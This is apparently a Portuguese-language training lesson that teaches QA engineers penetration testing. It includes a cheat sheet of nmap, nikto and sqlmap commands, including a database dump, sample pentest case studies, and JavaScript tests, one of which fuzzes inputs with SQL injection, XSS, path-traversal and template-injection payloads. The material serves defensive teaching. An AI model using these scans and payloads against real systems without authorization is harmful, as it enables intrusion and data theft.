| XSS em admin | 6.5 | 🟡 Média | 💰 Baixo | ⚡ Trivial | 🟡 P2 (30d) |
| Info disclosure (versões) | 5.3 | 🟡 Média | 💰 Baixo | ⚡ Trivial | 🔵 P3 (90d) |
| Credentials no Git | 9.1 | 🔴 Crítica | 💰💰💰 Alto | ⚡ Trivial | 🔴 P0 (imediato) |

**Legenda de Prioridade:**
- **P0**: Emergência - Correção em 0-24h (desabilitar funcionalidade se necessário)
- **P1**: Crítico - Correção em 7 dias
- **P2**: Alto - Correção em 30 dias
- **P3**: Médio - Correção em 90 dias
- **P4**: Baixo - Backlog (sem SLA)

---

## 📋 Cheat Sheet: Pentest (Para QAs)

### Ferramentas Essenciais para QA

**Nmap** (Reconhecimento):
```bash
# Scan básico de portas
nmap -sV target.com

# Scan de vulnerabilidades
nmap --script vuln target.com
```

**Nikto** (Web server scanning):
```bash
# Scan básico
nikto -h https://target.com

# Scan com autenticação
nikto -h https://target.com -id user:pass
```

**SQLMap** (SQL Injection):
```bash
# Teste automático de SQLi
sqlmap -u "https://target.com/page?id=1" --batch

# Dump database
sqlmap -u "URL" --dbs --batch
```

### Quando QA deve ESCALAR para Pentester

❌ **NÃO tente sozinho (escale)**:
- Exploitation avançado (RCE, privilege escalation)
- Post-exploitation (lateral movement, persistence)
- Social engineering
- Descoberta de 0-days

✅ **QA pode fazer (básico)**:
- Interpretação de relatórios de pentest
- Validação de correções (reproduzir exploits do relatório)
- Fuzzing com payloads comuns (SQLi, XSS)
- Testes de controle de acesso (IDOR)

### Como Interpretar Relatório de Pentest

**Seções típicas**:
1. Executive Summary (para C-Level)
2. Technical Findings (para Dev/QA)
3. Proof of Concepts (steps to reproduce)
4. Remediation Recommendations

**Priorização**:
- CVSS Score é ponto de partida, não decisão final
- Considere: Exploitability + Contexto de Negócio
- Falhas em auth/pagamentos = P0 sempre

### Links Úteis

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [Nmap NSE Scripts](https://nmap.org/nsedoc/)

---

## 📝 Resumo

### Principais Conceitos

- **Pentest é simulação controlada de ataque real**: Combina ferramentas automatizadas com expertise humano para encontrar vulnerabilidades que scanners não detectam
- **3 metodologias principais**: OWASP Testing Guide (web apps), PTES (processo completo), NIST SP 800-115 (compliance governamental)
- **5 fases do pentest**: (1) Reconhecimento, (2) Varredura/Enumeração, (3) Exploração, (4) Pós-Exploração, (5) Relatório
- **Tipos de pentest**: Black Box (sem informação), Gray Box (acesso parcial), White Box (acesso total) - Gray Box é o mais comum (60% do mercado)
- **Ferramentas essenciais**: Nmap (scanning), Metasploit (exploitation), Burp Suite (web apps), SQLMap (SQL injection), Nikto (web server scan)
- **Relatório é tão importante quanto o teste**: Deve ter sumário executivo (para gestão), achados técnicos detalhados (para dev/ops) e recomendações priorizadas
- **Priorização por CVSS + contexto de negócio**: CVSS dá severidade técnica, mas impacto ao negócio deve ajustar prioridades finais

### Pontos-Chave para Lembrar

- ✅ **Pentest ≠ Vulnerability Scan**: Pentest envolve exploração manual e pensamento criativo; scanners automatizados apenas listam vulnerabilidades potenciais
- ✅ **Sempre tenha autorização por escrito**: Pentest sem permissão explícita é crime (Lei 12.737/2012 - Lei Carolina Dieckmann)
- ✅ **Regras de Engajamento são sagradas**: Nunca execute DoS, delete dados ou saia do escopo autorizado - mesmo que seja tecnicamente possível
- ✅ **Documentação é evidência legal**: Screenshots, logs, vídeos - tudo deve ser documentado para provar exploração e defender o pentester se questionado
- ✅ **CVSS é guia, não lei**: Uma SQLi em checkout (CVSS 9.8) é mais crítica que SQLi em painel admin interno (mesmo CVSS) - contexto de negócio importa
- ✅ **Limpeza é obrigatória**: Sempre remova backdoors, arquivos de teste e limpe rastros ao final do pentest (ou documente o que foi deixado)
- ✅ **QA pode aprender com pentest**: Técnicas de pentest (fuzzing, manipulação de requests, análise de responses) são úteis em testes funcionais de segurança
- ✅ **Pentest é exercício de humildade**: Não se ofenda se pentester achar falhas no seu código - objetivo é melhorar segurança, não culpar pessoas

### QA Security vs Pentester: Diferenças e Sinergias

| Aspecto | QA Security | Pentester |
|---------|-------------|-----------|
| **Objetivo** | Prevenir vulnerabilidades durante desenvolvimento | Encontrar vulnerabilidades antes de atacantes reais |
| **Timing** | Contínuo, durante todo o ciclo de dev | Pontual, antes de releases ou anualmente |
| **Profundidade** | Testes de regressão, casos de borda, validações | Exploração profunda, chains de ataque, criatividade |
| **Ferramentas** | SAST, DAST, SCA integrados no CI/CD | Ferramentas manuais + scripts customizados |
| **Mentalidade** | "Como garantir que isso funciona corretamente e com segurança?" | "Como um atacante quebraria isso?" |
| **Cobertura** | 100% da aplicação (testes contínuos) | Amostragem focada em ativos críticos |
| **Output** | Issues em Jira, bugs reportados | Relatório executivo + técnico detalhado |

**🤝 Sinergia entre QA e Pentester:**
- **QA prepara terreno para pentest**: Testes de segurança contínuos reduzem findings triviais em pentests
- **Pentest encontra o que QA perdeu**: Exploração criativa detecta falhas de lógica de negócio que testes automatizados não pegam
- **QA valida correções de pentest**: Após correções, QA adiciona testes de regressão para garantir que vulnerabilidades não retornem
- **QA aprende técnicas de pentest**: Fuzzing, manipulação de requests, análise de responses - QA pode aplicar no dia a dia

### Aplicação Prática no Contexto CWI

**Cenários reais de pentest em projetos CWI:**

#### 1. Pentest de Aplicação Bancária (Cliente: Banco XYZ)
```yaml
Tipo: Gray Box Web + API Pentest
Duração: 3 semanas
Escopo:
  - Internet banking (React SPA)
  - API REST (/accounts, /transactions, /pix)
  - Mobile apps (iOS + Android)
Resultados:
  - 🔴 3 vulnerabilidades críticas:
    1. IDOR em /api/accounts/{id} (acesso a contas de outros clientes)
    2. Race condition em transferências (duplicação de crédito)
    3. JWT com "none" algorithm aceito (bypass de autenticação)
  - 🟠 7 vulnerabilidades altas
  - 🟡 12 vulnerabilidades médias
Impacto:
  - Correção de todas as críticas em 48h
  - Testes de regressão criados pelo time de QA
  - Treinamento de segurança para 50 desenvolvedores
```

#### 2. Pentest Interno de Infraestrutura (Cliente: Varejo Y)
```yaml
Tipo: Black Box Internal Network Pentest
Duração: 2 semanas
Objetivo: Simular insider malicioso e testar segmentação de rede
Resultados:
  - ✅ Comprometimento do Domain Controller em 3 dias
  - ✅ Acesso a 500+ senhas de usuários (via DCSync)
  - ✅ Exfiltração de dados financeiros (compartilhamento de rede sem ACL)
Vulnerabilidades exploradas:
  - Service account com senha fraca (Kerberoasting)
  - Service account é Domain Admin (misconfiguration)
  - Credenciais em plaintext em scripts (Git history)
Recomendações implementadas:
  - Segmentação de rede (VLANs por função)
  - Rotação de senhas de service accounts (quarterly)
  - Implementação de tiering model (admin tier 0/1/2)
  - LAPS (Local Administrator Password Solution)
```

#### 3. Pentest de API Marketplace (Cliente: E-commerce Z)
```yaml
Tipo: White Box API + Code Review
Duração: 4 semanas
Tecnologias: Node.js (Express), MongoDB, AWS Lambda
Resultados críticos:
  - 🔴 Mass assignment em /api/users (elevar role para admin)
  - 🔴 NoSQL injection em filtros de busca
  - 🔴 Lack of rate limiting (brute force viável)
  - 🔴 Secrets hardcoded em 15 arquivos diferentes
Melhorias implementadas:
  - Refatoração completa de autenticação/autorização
  - Implementação de schema validation (Joi)
  - Secrets movidos para AWS Secrets Manager
  - Rate limiting com Redis
  - Code review de segurança obrigatório (novo processo)
```

**🎓 Como QA CWI pode aplicar técnicas de pentest no dia a dia:**

1. **Testes de autorização sistematizados:**
   ```javascript
   // Exemplo: Teste automatizado de IDOR
   test('deve bloquear acesso a recurso de outro usuário', async () => {
     const user1Token = await login('user1@exemplo.com');
     const user2Resource = await createResourceAsUser2(); // ID: 123
     
     const response = await api.get('/api/resources/123')
       .set('Authorization', `Bearer ${user1Token}`);
     
     expect(response.status).toBe(403); // Forbidden
     expect(response.body.error).toContain('access denied');
   });
   ```

2. **Fuzzing de inputs em testes de integração:**
   ```javascript
   // Exemplo: Fuzzing de parâmetros de busca
   const maliciousPayloads = [
     "' OR '1'='1",           // SQLi
     "<script>alert(1)</script>",  // XSS
     "../../etc/passwd",      // Path traversal
     "${7*7}",                // SSTI
     "admin' --"              // SQLi comment
   ];
   
   maliciousPayloads.forEach(payload => {
     test(`deve sanitizar input malicioso: ${payload}`, async () => {
       const response = await api.get(`/search?q=${payload}`);
       expect(response.status).not.toBe(500); // Não deve crashar
       expect(response.body).not.toContain(payload); // Não deve refletir input
     });
   });
   ```

3. **Validação de headers de segurança:**
   ```javascript
   test('deve incluir headers de segurança obrigatórios', async () => {
     const response = await api.get('/');
     
     expect(response.headers['x-frame-options']).toBe('DENY');
     expect(response.headers['x-content-type-options']).toBe('nosniff');
     expect(response.headers['strict-transport-security']).toContain('max-age');
     expect(response.headers['content-security-policy']).toBeDefined();
   });
   ```

### Próximos Passos

- **Próxima aula**: [Aula 2.4: Automação de Testes de Segurança](./lesson-2-4.md) - Aprenda a integrar ferramentas de pentest em pipelines CI/CD
- **Prática recomendada**: Monte um lab pessoal (Vulnhub, HackTheBox, TryHackMe) e pratique técnicas de pentest em ambientes controlados
- **Certificações sugeridas**: 
  - **CEH (Certified Ethical Hacker)**: Entrada no mundo de pentest
  - **OSCP (Offensive Security Certified Professional)**: Hands-on, reconhecido globalmente
  - **eWPT (eLearnSecurity Web Penetration Tester)**: Foco em web apps

---

**Aula Anterior**: [Aula 2.2: DAST - Dynamic Application Security Testing](./lesson-2-2.md)  
**Próxima Aula**: [Aula 2.4: Automação de Testes de Segurança](./lesson-2-4.md)  
**Voltar ao Módulo**: [Módulo 2: Testes de Segurança na Prática](../index.md)

---

## ❌ Erros Comuns que QAs Cometem com Pentest

### 1. **Achar que QA precisa ser pentester expert**

**Por quê é erro**: Expectativa irreal gera frustração e síndrome do impostor.

**Solução**: Seu papel é interpretar relatórios e validar correções, não executar exploitation avançado. Saiba quando escalar para especialista.

### 2. **Não preparar escopo antes de contratar pentester**

**Por quê é erro**: Pentester perde tempo descobrindo o que testar → Custo dobra.

**Solução**: Documente: URLs, credenciais de teste, áreas críticas, out-of-scope. Preparação economiza 50% do tempo.

### 3. **Tratar relatório de pentest como "lista de tarefas" sem priorizar**

**Por quê é erro**: 30 findings mas apenas 3 são realmente críticos no seu contexto.

**Solução**: Re-priorize findings por contexto de negócio, não apenas CVSS. IDOR em checkout > XSS em página de ajuda.

### 4. **Ignorar recomendações de pentest após correção**

**Por quê é erro**: Pentester sugere "implementar rate limiting", dev apenas corrige o finding específico.

**Solução**: Leia seção "Recommendations" do relatório. Aplique melhorias sistêmicas, não apenas patches.

### 5. **Não validar correções antes de re-test**

**Por quê é erro**: Dev diz "corrigido", mas pentest encontra novamente → Custo extra de re-test.

**Solução**: QA valida TODAS as correções reproduzindo exploits do relatório antes de chamar pentester novamente.

---

